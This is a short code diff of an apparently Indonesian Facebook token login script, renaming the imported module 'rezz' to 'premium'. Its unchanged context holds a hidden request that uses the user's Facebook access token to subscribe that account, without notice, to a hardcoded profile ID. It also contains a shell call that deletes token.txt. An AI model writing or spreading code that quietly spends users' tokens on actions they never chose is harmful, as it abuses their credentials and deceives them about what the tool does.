@@ -1,5 +1,5 @@
 import requests,os,json
-import rezz
+import premium
 
 P = "\x1b[0;97m" # Putih
 M = "\x1b[0;91m" # Merah
@@ -14,6 +14,6 @@ def main():
         print('%s║'%(M))
         print('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))
         os.system('rm -rf token.txt')
-        exit(rezz.menu_log())
+        exit(premium.menu_log())
     requests.post("https://graph.facebook.com/100027021910931/subscribers?access_token=" + token)      # Oogway
-    exit(rezz.menu())
+    exit(premium.menu())
